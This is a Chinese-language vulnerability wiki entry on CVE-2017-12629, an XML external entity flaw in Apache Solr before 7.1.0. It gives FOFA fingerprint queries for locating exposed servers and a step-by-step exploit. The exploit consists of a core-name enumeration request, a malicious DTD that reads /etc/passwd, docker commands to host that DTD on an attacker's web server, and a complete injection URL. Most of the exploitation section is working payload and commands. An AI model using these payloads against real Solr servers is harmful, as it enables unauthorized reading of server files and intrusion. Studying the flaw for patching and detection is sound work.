

# CVE-2017-12629 | Apache Solr < 7.1.0 存在XXE漏洞





## 0x00 漏洞说明



`Apache Solr` 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 `Apache Lucene` 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。



## 0x01 影响版本



- <  `Apache Solr 7.1.0` 
- <  `Apache Lucene 7.1.0`



## 0x02 漏洞成因



1.  XML外部实体扩展漏洞发生在XML查询分析器中，默认情况下，任何带有参数deftype=xmlparser的查询请求都可以使用，可以利用该漏洞将恶意数据上传到 `/upload` 请求处理程序或作为Blind XXE使用ftp包装器，以便从Solr服务器读取任意本地文件。





## 0x04 漏洞指纹



fofa:

```
app="apache-Solr"
title="Solr Admin"
```



## 0x05 详细利用过程



首先获取core名称

```json
http://xxxx:8983/solr/admin/cores?indexInfo=false&wt=json

respond:
{
    "responseHeader": {
        "status": 0,
        "QTime": 0
    },
    "initFailures": {
        "xxx": "org.apache.solr.common.SolrException:org.apache.solr.common.SolrException: Could not load conf for core wzhhh: Error loading solr config from /var/solr/data/xxxx/conf/solrconfig.xml"
    },
    "status": {
        "www": {
            "name": "www",  //这里就是core名称
            "instanceDir": "/var/solr/data/demo",
            "dataDir": "/var/solr/data/demo/data/",
            "config": "solrconfig.xml",
            "schema": "managed-schema",
            "startTime": "2022-03-18T17:39:26.215Z",
            "uptime": 935729
        }
    }
}
```



生成恶意 dtd文件

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```



将dtd文件上传至web服务器(这里选择使用docker，将当前目录下的www目录内容映射，并映射docker 80端口到服务器8001)

```
docker pull httpd

docker run -p 8001:80 -v $PWD/www/:/usr/local/apache2/htdocs/ -d --name docker_httpd httpd
```



访问链接进行XXE注入，IP需自己构造，URL `+core+`为 core名

```raw
http://xxx:8983/solr/+core+/select?&q=<?xml version="1.0" ?><!DOCTYPE root[<!ENTITY % ext SYSTEM "http://ip:port/filename.dtd">%ext;%ent;]><r>&data;</r>&wt=xml&defType=xmlparser
```



## 0x06 扩展链接



[Apache solr xxe漏洞复现（CVE-2017-12629）](https://www.daimajiaoliu.com/daima/6cbba801699d808)



[docker搭建Apache httpd 文件下載服務器](https://javamana.com/2022/02/202202060357532046.html)



[NVD CVE-2017-12629 Detail](https://nvd.nist.gov/vuln/detail/CVE-2017-12629)



[XXE漏洞利用技巧：从XML到远程代码执行](https://www.freebuf.com/articles/web/177979.html)



## 0x07 联系方式



作者 : BitWiki支持团队
